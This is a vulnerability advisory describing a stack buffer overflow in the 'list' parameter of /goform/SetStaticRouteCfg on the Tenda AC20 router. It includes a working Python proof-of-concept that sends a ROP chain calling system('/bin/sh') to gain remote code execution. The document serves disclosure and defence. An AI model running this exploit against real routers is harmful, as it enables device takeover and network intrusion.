# Tenda AC20_V16.03.08.05 has a stack overflow in /goform/SetStaticRouteCfg

## Basic Information

Vulnerability manufacturer: Shenzhen Jixiang Tenda Technology Co., Ltd.

Vulnerability level: high risk

Manufacturer's official website: https://www.tenda.com.cn

Affected object type: network equipment

Affected product: Tenda AC20

Affected product version: AC20_V16.03.08.05

Is it a product component vulnerability: No

## 1. Vulnerability Overview

Tenda AC20 is a wireless router from China's Tenda company.

Tenda AC20 has a buffer overflow vulnerability. The vulnerability is caused by the parameter list in the file /goform/SetStaticRouteCfg failing to correctly verify the length of the input data. Attackers can exploit this vulnerability to execute arbitrary code on the system.

## 2. Vulnerability Details

ida analyzes the binary file /bin/httpd, and WebVar obtains the list parameter and passes it to save_staticroute_data

![image-20250721181544396](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250721181544396.png)

There is a stack overflow in sscanf, which directly reads our parameters without restriction. Here we can control the return address of the program, successfully use the rop chain getshell, and pass in a large number of bytes at the same time, which can cause the program to crash.

![image-20250721181730021](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250721181730021.png)

![image-20250721185025546](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250721185025546.png)

POC

```
from pwn import *
import requests




libc_base = 0x7f55e000
cmd = b"/bin/sh"
system=0x0060320
binsh=0x0006AE30
 
gadget1=libc_base+0x00060530
print(hex(gadget1))
gadget2=libc_base+0x0000DC1C
system_addr=libc_base+system
binsh_addr=libc_base+binsh

payload = cyclic(80-4)

payload+= p32(gadget1)*2+b"A"*20+p32(binsh_addr)+p32(system_addr)+b"A"*12+p32(gadget2)

url = "http://192.168.87.135/goform/SetStaticRouteCfg"


params = {"list": payload}
response = requests.get(url, params=params)
response = requests.get(url, params=params)
print(response.text)

```



## 3. Impact of the Vulnerability

1. Attackers can exploit this vulnerability to RCE
1. Attackers can exploit this vulnerability to cause service crash

## 4. Repair plan

1. Contact relevant vendors to obtain security patches and fix vulnerabilities in a timely manner
2. Contact relevant security vendors to update security blocking strategies in a timely manner
3. Temporarily perform security checks on interface parameters

‍